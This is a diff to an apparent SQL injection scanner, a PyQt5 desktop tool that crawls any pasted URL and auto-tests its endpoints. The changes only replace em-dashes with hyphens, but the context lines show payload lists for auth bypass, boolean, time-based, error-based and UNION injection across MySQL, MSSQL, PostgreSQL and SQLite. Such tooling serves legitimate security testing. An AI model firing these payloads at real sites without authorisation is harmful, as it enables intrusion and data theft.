@@ -40,8 +40,8 @@ C_CODE    = "#0A1120"
 # Payload sets
 
 BASIC_PAYLOADS = [
-    {"payload": "'",                                                     "label": "Single quote — syntax break",         "tags": "error"},
-    {"payload": "\"",                                                    "label": "Double quote — syntax break",         "tags": "error"},
+    {"payload": "'",                                                     "label": "Single quote - syntax break",         "tags": "error"},
+    {"payload": "\"",                                                    "label": "Double quote - syntax break",         "tags": "error"},
     {"payload": "' OR '1'='1",                                          "label": "Classic auth bypass",                 "tags": "auth"},
     {"payload": "' OR 1=1--",                                           "label": "Always-true + comment",               "tags": "auth"},
     {"payload": "admin'--",                                             "label": "Admin login bypass",                  "tags": "auth"},
@@ -49,13 +49,13 @@ BASIC_PAYLOADS = [
     {"payload": "' AND 1=1--",                                          "label": "Boolean true probe",                  "tags": "boolean"},
     {"payload": "' AND 1=2--",                                          "label": "Boolean false probe",                 "tags": "boolean"},
     {"payload": "1 OR 1=1",                                             "label": "Numeric context bypass",              "tags": "boolean"},
-    {"payload": "'OR'+1+\"OR\"+1=0",                                    "label": "Polyglot — all quote contexts",       "tags": "polyglot"},
+    {"payload": "'OR'+1+\"OR\"+1=0",                                    "label": "Polyglot - all quote contexts",       "tags": "polyglot"},
     {"payload": "SLEEP(1) /*' or SLEEP(1) or '\" or SLEEP(1) or \"*/", "label": "Polyglot time-based",                 "tags": "time"},
     {"payload": "'; SLEEP(5)--",                                        "label": "MySQL SLEEP delay",                   "tags": "time"},
     {"payload": "'; WAITFOR DELAY '0:0:5'--",                           "label": "MSSQL WAITFOR delay",                 "tags": "time"},
     {"payload": "'; SELECT pg_sleep(5)--",                              "label": "PostgreSQL sleep",                    "tags": "time"},
     {"payload": "' AND RANDOMBLOB(200000000)--",                        "label": "SQLite compute delay",                "tags": "time"},
-    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",       "label": "MySQL error — leaks version",         "tags": "error"},
+    {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",       "label": "MySQL error - leaks version",         "tags": "error"},
     {"payload": "' AND 1=CONVERT(int,'a')--",                           "label": "MSSQL type-cast error",               "tags": "error"},
     {"payload": "' UNION SELECT NULL--",                                "label": "Union 1-column probe",                "tags": "union"},
     {"payload": "' UNION SELECT NULL,NULL--",                           "label": "Union 2-column probe",                "tags": "union"},
@@ -120,7 +120,7 @@ ADVANCED_GROUPS = {
             ("' AND (SELECT 1 FROM sqlite_master LIMIT 1)=1--", "SQLite exists"),
         ],
     },
-    "Time-Based — All Engines": {
+    "Time-Based - All Engines": {
         "on": True,
         "payloads": [
             ("'; SLEEP(5)--",                              "MySQL stacked SLEEP"),
@@ -213,7 +213,7 @@ ERROR_SIGNATURES = [
 
 
 # ─────────────────────────────────────────────────────────────────────────────
-# Worker thread — crawls then tests automatically
+# Worker thread - crawls then tests automatically
 # ─────────────────────────────────────────────────────────────────────────────
 
 class AutoScanWorker(QThread):
@@ -414,7 +414,7 @@ class AutoScanWorker(QThread):
                     result["status"]  = "TIMEOUT"
                     result["time"]    = round(time.perf_counter() - t_start, 3)
                     result["flagged"] = True
-                    result["flags"].append("Timeout — possible time-based injection")
+                    result["flags"].append("Timeout - possible time-based injection")
 
                 except Exception as e:
                     result["status"] = "ERROR"
@@ -488,7 +488,7 @@ class QuickLaunchTab(QWidget):
     def _build_left(self) -> QWidget:
         from PyQt5.QtWidgets import QScrollArea
 
-        # Outer wrapper — fixed width, dark bg, clip
+        # Outer wrapper - fixed width, dark bg, clip
         outer = QWidget()
         outer.setStyleSheet(f"background: {C_SIDEBAR}; border-right: 1px solid {C_BORDER};")
         outer.setFixedWidth(310)
@@ -496,7 +496,7 @@ class QuickLaunchTab(QWidget):
         outer_lay.setContentsMargins(0, 0, 0, 0)
         outer_lay.setSpacing(0)
 
-        # Scrollable inner panel — all content lives here
+        # Scrollable inner panel - all content lives here
         scroll = QScrollArea()
         scroll.setWidgetResizable(True)
         scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
@@ -535,7 +535,7 @@ class QuickLaunchTab(QWidget):
         """)
         lay.addWidget(self.url_input)
 
-        hint = QLabel("Paste any URL — the tool finds endpoints automatically.")
+        hint = QLabel("Paste any URL - the tool finds endpoints automatically.")
         hint.setStyleSheet(f"font-size: 10px; color: {C_DIMMED}; background: transparent;")
         hint.setWordWrap(True)
         lay.addWidget(hint)
@@ -564,10 +564,10 @@ class QuickLaunchTab(QWidget):
         mc = QVBoxLayout(self.mode_card)
         mc.setContentsMargins(12, 10, 12, 10)
         mc.setSpacing(4)
-        self.mode_title = QLabel("Basic — Quick Probe")
+        self.mode_title = QLabel("Basic - Quick Probe")
         self.mode_title.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_TEXT}; background: transparent;")
         self.mode_desc = QLabel(
-            f"{len(BASIC_PAYLOADS)} payloads — error triggers, auth bypass, "
+            f"{len(BASIC_PAYLOADS)} payloads - error triggers, auth bypass, "
             "boolean probes, polyglot time-based. Completes in under 60 seconds."
         )
         self.mode_desc.setStyleSheet(f"font-size: 11px; color: {C_MUTED}; background: transparent; line-height: 1.5;")
@@ -717,10 +717,10 @@ class QuickLaunchTab(QWidget):
         # Stat chips
         cr = QHBoxLayout()
         cr.setSpacing(10)
-        self.chip_tested   = self._chip("Tests Run",  "—", C_MUTED)
-        self.chip_flagged  = self._chip("Findings",   "—", C_DANGER)
-        self.chip_endpoints= self._chip("Endpoints",  "—", C_ACCENT)
-        self.chip_clean    = self._chip("Clean",       "—", C_SUCCESS)
+        self.chip_tested   = self._chip("Tests Run",  "-", C_MUTED)
+        self.chip_flagged  = self._chip("Findings",   "-", C_DANGER)
+        self.chip_endpoints= self._chip("Endpoints",  "-", C_ACCENT)
+        self.chip_clean    = self._chip("Clean",       "-", C_SUCCESS)
         for c in [self.chip_tested, self.chip_flagged,
                   self.chip_endpoints, self.chip_clean]:
             cr.addWidget(c)
@@ -756,7 +756,7 @@ class QuickLaunchTab(QWidget):
 
         # Findings header
         fh = QHBoxLayout()
-        ft = QLabel("Findings  —  only flagged results shown")
+        ft = QLabel("Findings  -  only flagged results shown")
         ft.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_TEXT}; background: transparent;")
         self.flagged_badge = QLabel("")
         self.flagged_badge.setStyleSheet(f"font-size: 12px; font-weight: 700; color: {C_DANGER}; background: transparent;")
@@ -836,7 +836,7 @@ class QuickLaunchTab(QWidget):
             self.basic_btn.setStyleSheet(inactive)
             self.adv_frame.show()
             total = sum(len(d["payloads"]) for d in ADVANCED_GROUPS.values())
-            self.mode_title.setText("Advanced — Deep Probe")
+            self.mode_title.setText("Advanced - Deep Probe")
             self.mode_desc.setText(
                 f"{total} payloads across {len(ADVANCED_GROUPS)} categories.\n"
                 "Select groups below. Covers all major DB engines."
@@ -846,9 +846,9 @@ class QuickLaunchTab(QWidget):
             self.basic_btn.setStyleSheet(active)
             self.advanced_btn.setStyleSheet(inactive)
             self.adv_frame.hide()
-            self.mode_title.setText("Basic — Quick Probe")
+            self.mode_title.setText("Basic - Quick Probe")
             self.mode_desc.setText(
-                f"{len(BASIC_PAYLOADS)} payloads — error triggers, auth bypass,\n"
+                f"{len(BASIC_PAYLOADS)} payloads - error triggers, auth bypass,\n"
                 "boolean probes, polyglot time-based.\n"
                 "Completes in under 60 seconds."
             )
@@ -994,11 +994,11 @@ class QuickLaunchTab(QWidget):
         self.chip_clean._val.setText(str(clean))
         if flagged:
             self.status_lbl.setText(
-                f"Done — {total} tests, {flagged} potential vulnerabilities found. Check the Findings table."
+                f"Done - {total} tests, {flagged} potential vulnerabilities found. Check the Findings table."
             )
         else:
             self.status_lbl.setText(
-                f"Done — {total} tests, no obvious vulnerabilities detected."
+                f"Done - {total} tests, no obvious vulnerabilities detected."
             )
 
     def _on_row_selected(self):
@@ -1030,7 +1030,7 @@ class QuickLaunchTab(QWidget):
     def _reset_chips(self):
         for c in [self.chip_tested, self.chip_flagged,
                   self.chip_endpoints, self.chip_clean]:
-            c._val.setText("—")
+            c._val.setText("-")
 
     def _clear(self):
         self._results = []
